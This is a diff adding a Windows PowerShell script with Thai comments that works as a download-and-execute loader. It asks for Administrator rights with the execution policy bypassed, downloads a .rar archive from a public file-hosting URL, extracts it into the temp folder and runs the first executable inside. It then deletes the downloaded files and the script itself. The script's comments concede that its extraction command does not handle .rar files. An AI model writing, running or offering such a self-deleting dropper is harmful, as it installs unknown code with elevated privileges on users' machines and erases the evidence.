@@ -1,0 +1,38 @@
+# 1. ตั้งค่า URL และตำแหน่งจัดเก็บ
+$url = "https://files.catbox.moe/efrw7v.rar"
+$zipFile = "$env:TEMP\my_setup.rar"
+$extractPath = "$env:TEMP\my_setup_extracted"
+
+# 2. ตรวจสอบและขอสิทธิ์ Administrator (ถ้ายังไม่มี)
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# 3. ดาวน์โหลดไฟล์
+Write-Host "[*] Downloading file..." -ForegroundColor Cyan
+Invoke-WebRequest -Uri $url -OutFile $zipFile -UseBasicParsing
+
+# 4. แตกไฟล์ (หมายเหตุ: PowerShell มาตรฐานรองรับ .zip หากเป็น .rar เครื่องต้องมี WinRAR หรือ 7-Zip)
+if (! (Test-Path $extractPath)) { New-Item -ItemType Directory -Path $extractPath }
+Write-Host "[*] Extracting files..." -ForegroundColor Cyan
+
+# ใช้คำสั่ง Shell Application ในการแตกไฟล์ (รองรับ .zip เป็นหลัก)
+# หากเป็น .rar แนะนำให้ใช้ Expand-Archive หรือเรียกใช้ WinRAR/7zip path
+Expand-Archive -Path $zipFile -DestinationPath $extractPath -Force
+
+# 5. รันไฟล์ที่แตกออกมา (เปลี่ยนชื่อ 'your_app.exe' เป็นชื่อไฟล์จริงใน .rar)
+Write-Host "[*] Running application..." -ForegroundColor Green
+$exeFile = Get-ChildItem -Path $extractPath -Filter "*.exe" | Select-Object -First 1
+if ($exeFile) {
+    Start-Process -FilePath $exeFile.FullName -Wait
+}
+
+# 6. ลบไฟล์ที่ดาวน์โหลดมาและโฟลเดอร์ชั่วคราว
+Write-Host "[*] Cleaning up..." -ForegroundColor Yellow
+Remove-Item -Path $zipFile -Force
+Remove-Item -Path $extractPath -Recurse -Force
+
+# 7. ลบตัวเอง (Self-delete)
+Write-Host "[+] Done. Self-destructing..." -ForegroundColor Red
+Remove-Item -Path $PSCommandPath -Force
